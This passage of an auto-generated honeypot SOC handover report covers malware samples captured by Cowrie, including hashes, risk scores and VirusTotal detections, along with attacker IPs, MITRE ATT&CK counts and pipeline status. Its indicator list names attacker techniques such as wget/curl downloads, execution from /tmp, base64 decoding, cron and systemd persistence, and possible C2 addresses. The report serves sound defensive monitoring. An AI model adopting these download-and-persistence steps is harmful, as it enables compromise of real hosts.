| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `66.132.195[.]47` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `104.194.10[.]16` | US | ReliableSite.Net LLC | **100** ⚠️ | 25 |
| `57.129.120[.]143` | DE | OVH GmbH | **100** ⚠️ | 13 |
| `179.56.17[.]84` | CL | Telefonica del Sur S.A. | **100** ⚠️ | 1 |
| `193.90.12[.]122` | NO | GLOBALCONNECT AS | **100** ⚠️ | 50 |
| `187.154.98[.]53` | MX | Uninet S.A. de C.V. | **100** ⚠️ | 4 |
| `66.132.195[.]110` | US | Censys, Inc. | **100** ⚠️ | 0 |
| `146.199.17[.]126` | GB | INFONET Services Corporation | **100** ⚠️ | 4 |
| `77.90.185[.]17` | LT | Limited Network LTD | **100** ⚠️ | 50 |
| `195.78.100[.]163` | UA | Ukrtranstelecom tc, ltd | **100** ⚠️ | 13 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 122 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 117 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 2 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| AbuseIPDB score 6 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 201 cases |
| Tool 34  | Credential Extractor        | ✅ 182 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 59 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (10.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 40 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 23 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 117 priority case(s) shown individually · 27 recon entry/entries in table (10 group(s) consolidating 47 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-20T18:35:25Z_
